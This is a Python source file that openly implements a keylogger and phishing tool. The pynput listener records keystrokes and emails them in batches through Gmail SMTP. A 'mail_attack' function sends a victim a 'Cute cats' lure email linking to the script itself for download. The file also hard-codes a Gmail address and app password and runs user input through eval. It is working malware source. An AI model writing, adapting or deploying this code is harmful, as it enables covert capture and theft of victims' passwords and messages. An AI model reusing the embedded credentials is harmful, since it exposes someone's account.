# # from pynput.keyboard import Key, Listener
# # import logging

# # logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")


# # def on_press(key):
# #     logging.info(str(key))


# # with Listener(on_press=on_press) as listener:
# #     listener.join()

# import smtplib
# from pynput.keyboard import Key, Listener
# import getpass

# # setup email
# email=input('Enter mail: ')
# password=getpass.getpass(prompt='Password: ',stream=None)
# server=smtplib.SMTP_SSL('smtp.gmail.com',465)
# server.login(email,password)

# # logger
# full_log=''
# word=''
# email_char_limit=50


# def on_press(key):
#     global word
#     global full_log
#     global email
#     global email_char_limit

#     if key== Key.space or key== Key.enter:
#         word +=' '
#         full_log += word
#         word=''
#         if len(full_log) >= email_char_limit:
#             print(full_log)
#             send_mail()
#             full_log=''
#     elif key==Key.backspace:
#         word=word[:-1]
#     elif key== Key.shift_l or key== Key.shift_r:
#         return
#     else:
#         char=f'{key}'
#         char=char[1:-1]
#         word += char

#     if key == Key.esc:
#         return False

# def send_mail():
#     server.sendmail(email,email,full_log)

# with Listener(on_press=on_press) as listener:
#     listener.join()


import smtplib
from pynput.keyboard import Key, Listener
import getpass
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import Encoders


def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit

    if key== Key.space or key== Key.enter:
        word +=' '
        full_log += word
        word=''
        if len(full_log) >= email_char_limit:
            print(full_log)
            send_mail()
            full_log=''
    elif key==Key.backspace:
        word=word[:-1]
    elif key== Key.shift_l or key== Key.shift_r:
        return
    else:
        char=f'{key}'
        char=char[1:-1]
        word += char

    if key == Key.esc:
        return False

# send logs to mail
def send_mail():
    server.sendmail(email,email,full_log)

# phishing email
def mail_attack():
    victim=input('Enter victims mail: ')

    # Create message container
    msg = MIMEMultipart('alternative')
    msg['Subject'] = "Cute cats"
    msg['From'] = email
    msg['To'] = victim

    # Create the body of the message
    html = """\
    <html>
    <head></head>
    <body>
        <p>Hi!<br>
        How are you?<br>
        Have you ever seen a kitten this cute?

            <a href="main.py" download="cute Cat">
            <img src="cute_cat.png" alt="Cute cat">
            </a>
            Check it out!!
        </p>
    </body>
    </html>
    """

    # Record the MIME type
    part = MIMEText(html, 'html')

    # Attach part into message container.
    msg.attach(part)
    # Send the message via local SMTP server.
    mail = smtplib.SMTP('smtp.gmail.com', 587)

    mail.ehlo()

    mail.starttls()

    mail.login('mrmarangi4@gmail.com', 'qfhigffawtopkjac')
    mail.sendmail(email, victim, msg.as_string())
    mail.quit()

def keylog_operation():
    with Listener(on_press=on_press) as listener:
        listener.join()

def menu():
    MENU='\
        1: Keylog \
        2: Phishing \
        3: Exit \
        '
    print(MENU)

if __name__=='__main__':
    # setup email
    email=input('Enter mail: ')
    password=getpass.getpass(prompt='Password: ',stream=None)
    server=smtplib.SMTP_SSL('smtp.gmail.com',465)
    server.login(email,password)

    # logger
    full_log=''
    word=''
    email_char_limit=50

    while True:
        menu()
        choice=eval(input("Choose operation: "))
        if choice ==1:
            keylog_operation()
        elif choice ==2:
            mail_attack()
        elif choice ==3:
            exit()
        else:
            print('Choice unknown')
            exit()